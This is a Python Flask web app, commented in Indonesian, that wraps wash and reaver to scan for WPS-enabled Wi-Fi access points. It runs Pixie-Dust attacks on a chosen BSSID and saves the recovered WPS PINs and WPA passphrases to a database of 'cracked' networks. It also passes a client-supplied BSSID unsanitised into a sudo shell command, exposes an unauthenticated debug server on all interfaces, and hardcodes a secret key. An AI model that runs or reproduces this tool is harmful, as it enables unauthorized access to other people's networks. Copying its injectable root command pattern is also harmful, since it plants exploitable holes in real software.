import subprocess
import threading
import sqlite3
import os
from flask import Flask, render_template, jsonify
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_wps_key'
socketio = SocketIO(app, cors_allowed_origins="*")

DB_FILE = "wps_results.db"

# --- Inisialisasi Database ---
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS cracked_wps 
                        (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                         ssid TEXT, bssid TEXT, pin TEXT, psk TEXT, 
                         date DATETIME DEFAULT CURRENT_TIMESTAMP)''')

# --- Fungsi Simpan Hasil ---
def save_result(ssid, bssid, pin, psk):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT INTO cracked_wps (ssid, bssid, pin, psk) VALUES (?, ?, ?, ?)", 
                     (ssid, bssid, pin, psk))

# --- Runner Command (Real-time) ---
def run_command(command, bssid_target=None):
    process = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    
    found_pin = None
    found_psk = None
    found_ssid = "Unknown"

    for line in iter(process.stdout.readline, ""):
        socketio.emit('terminal_output', {'data': line})
        
        # Parsing Output Reaver
        if "WPS PIN:" in line: found_pin = line.split(":")[-1].strip()
        if "WPA PSK:" in line: found_psk = line.split(":")[-1].strip()
        if "AP SSID:" in line: found_ssid = line.split(":")[-1].strip()

        # Simpan jika sukses
        if found_pin and found_psk:
            save_result(found_ssid, bssid_target or "N/A", found_pin, found_psk)
            socketio.emit('terminal_output', {'data': '\n[!] SUKSES: Data disimpan ke database.\n'})
            found_pin, found_psk = None, None # Reset

    process.stdout.close()
    process.wait()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/history')
def get_history():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.execute("SELECT * FROM cracked_wps ORDER BY date DESC")
        return jsonify(cursor.fetchall())

@app.route('/clear_history')
def clear_history():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("DELETE FROM cracked_wps")
    return jsonify({"status": "deleted"})

@socketio.on('start_scan')
def handle_scan():
    emit('terminal_output', {'data': '[*] Memulai Wash (Scanning WPS)... Tekan STOP nanti.\n'})
    threading.Thread(target=run_command, args=("sudo wash -i wlan0mon",)).start()

@socketio.on('start_attack')
def handle_attack(data):
    bssid = data['bssid']
    emit('terminal_output', {'data': f'[*] Menyerang {bssid} dengan Pixie-Dust...\n'})
    cmd = f"sudo reaver -i wlan0mon -b {bssid} -K 1 -vv"
    threading.Thread(target=run_command, args=(cmd, bssid)).start()

if __name__ == '__main__':
    init_db()
    print("Server berjalan di http://0.0.0.0:5000")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
